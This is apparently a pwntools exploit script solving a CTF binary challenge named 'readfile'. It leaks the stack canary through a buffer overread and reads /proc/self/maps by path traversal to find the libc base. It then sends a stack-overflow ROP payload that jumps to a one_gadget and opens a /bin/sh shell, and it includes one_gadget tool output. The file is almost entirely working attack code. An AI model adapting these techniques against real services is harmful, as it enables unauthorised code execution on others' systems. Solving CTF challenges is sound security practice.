#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'readfile')
elf = exe
libc = elf.libc
filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
set follow-fork-mode child
break *main+145
break *main+302
break *main+379
break *main+618
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
~/Desktop/CTF/Battlectf23/prequal/Pwn/Readfile: one_gadget libc.so.6 
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

~/Desktop/CTF/Battlectf23/prequal/Pwn/Readfile:
"""
def init():
    global io
    global elf
    global libc

    io = start()

def leak_canary():
    io.recvuntil("name:")
    io.send("A"*41)
    io.sendafter(">", "1")
    io.recvuntil("filename:")
    io.send("B"*48)
    io.recvuntil("B"*48+"A"*41)
    data = str(hex(unpack(io.recv(7).ljust(8, b'\x00'))))
    canary = int(data + "00", 16)
    info("Canary: %#x", canary)
    
    
    return canary

def one_gadget():
    io.sendline("1")
    io.recvuntil("filename:")
    io.send("../../../proc/self/"+"./"*12+"maps")
    io.recvuntil("[heap]")
    leak = io.recvline()
    libc.address = int(io.recv(12), 16)
    libc_gadget = libc.address + 0x50a37
    info("Libc base address: %#x", libc.address)
    io.recvuntil("1.")

    return libc_gadget

def rop(canary, libc_gadget):
    io.sendline("2")

    offset = 40

    payload = flat({
        offset: [
            canary,
            0,
            libc_gadget
        ]
    })

    io.sendlineafter(b'feedback: ', payload)

def main():
    
    init()
    canary = leak_canary()
    libc_gadget = one_gadget()
    rop(canary, libc_gadget)


    io.interactive()
    

if __name__ == '__main__':
    main()
